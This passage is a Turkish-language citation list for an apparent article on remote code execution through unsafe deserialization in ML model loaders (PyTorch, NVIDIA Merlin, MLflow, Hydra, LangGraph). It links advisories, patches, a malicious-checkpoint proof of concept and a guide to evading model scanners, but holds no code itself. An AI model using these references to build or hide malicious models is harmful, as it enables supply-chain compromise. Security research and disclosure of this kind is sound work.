- [4] [PyTorch – torch.load için güvenlik hususları](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blogu – CVE-2025-23298: NVIDIA Merlin'de Uzaktan Kod Yürütme](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI güvenlik duyurusu: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec yama commit'i b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Yama öncesi güvenlik açığı bulunan loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Kötü amaçlı checkpoint PoC'si (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Yama sonrası loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Modern AI/ML formatları ve kütüphaneleriyle Uzaktan Kod Yürütme](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate belgeleri](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit'i (RCE uyarısı)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi'den RCE'ye: LangGraph Checkpointer'ını Exploit Etme](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip hatalarını yüksek değerli AI/ML ödüllerine dönüştürme](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk güvenlik duyurusu ve PyFunc kavram kanıtı – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow kaynak kodu – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact indirme ve yükleme uç noktaları](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer statik tarayıcıdan kaçınma taksonomisi](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – MLTracer ile Kötü Amaçlı Model Tespiti](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch storage `_load_from_bytes` uygulaması](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle `find_class` uyumluluk eşlemesi](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle` import eşlemesi](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
